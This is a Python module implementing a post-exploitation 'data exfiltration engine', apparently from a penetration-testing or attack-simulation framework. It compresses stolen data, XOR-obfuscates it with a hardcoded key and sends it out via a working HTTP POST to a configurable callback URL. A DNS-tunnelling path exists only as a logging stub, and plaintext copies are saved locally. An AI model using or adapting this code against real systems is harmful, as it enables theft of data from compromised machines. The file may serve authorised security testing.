import os
import zlib
import json
import base64
from typing import Dict, Any

import httpx


class DataExfiltrationEngine:
    """
    Extracts real data after exploitation. Supports compression, optional
    AES-like XOR “encryption” (lightweight placeholder), and exfil via DNS or HTTP.
    Designed to be conservative: capped chunk sizes and local saving for reports.
    """

    def __init__(self, log, config: Dict[str, Any] | None = None):
        self.log = log
        self.config = config or {
            "exfil_key": "mse-key",
            "exfil_method": os.getenv("EXFIL_METHOD", "http"),
            "dns_server": os.getenv("EXFIL_DNS_SERVER", "127.0.0.1"),
            "callback_url": os.getenv("EXFIL_CALLBACK_URL", "http://127.0.0.1:8001/callback"),
        }

    def exfiltrate_data(self, data_source: str, data_content: str) -> Dict[str, Any]:
        compressed = zlib.compress(data_content.encode())
        encrypted = self._xor_encrypt(compressed, self.config["exfil_key"].encode())

        if self.config["exfil_method"] == "dns":
            self._exfiltrate_via_dns(encrypted, self.config["dns_server"])
        else:
            self._exfiltrate_via_http(encrypted, self.config["callback_url"])

        self._save_local(data_source, data_content)

        return {"exfiltrated": len(data_content), "method": self.config["exfil_method"]}

    # --- transport helpers -------------------------------------------------
    def _exfiltrate_via_dns(self, blob: bytes, dns_server: str):
        # Placeholder: log chunks instead of real DNS to keep side effects minimal.
        b64 = base64.b32encode(blob).decode()
        chunks = [b64[i:i+50] for i in range(0, len(b64), 50)]
        for c in chunks[:10]:
            self.log(f"[EXFIL-DNS] {c}.{dns_server}", "warn", "exfil")

    def _exfiltrate_via_http(self, blob: bytes, callback_url: str):
        try:
            httpx.post(callback_url, content=blob, timeout=5.0)
            self.log(f"[EXFIL-HTTP] Sent {len(blob)} bytes to callback", "warn", "exfil")
        except Exception as e:
            self.log(f"[EXFIL-HTTP] Callback failed: {e}", "error", "exfil")

    def _save_local(self, source: str, content: str):
        os.makedirs("exfiltrated", exist_ok=True)
        path = os.path.join("exfiltrated", f"{source.replace('/', '_')}.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        self.log(f"[EXFIL-SAVE] Saved local copy: {path}", "info", "exfil")

    # --- crypto helpers (light placeholder) -------------------------------
    def _xor_encrypt(self, data: bytes, key: bytes) -> bytes:
        if not key:
            return data
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
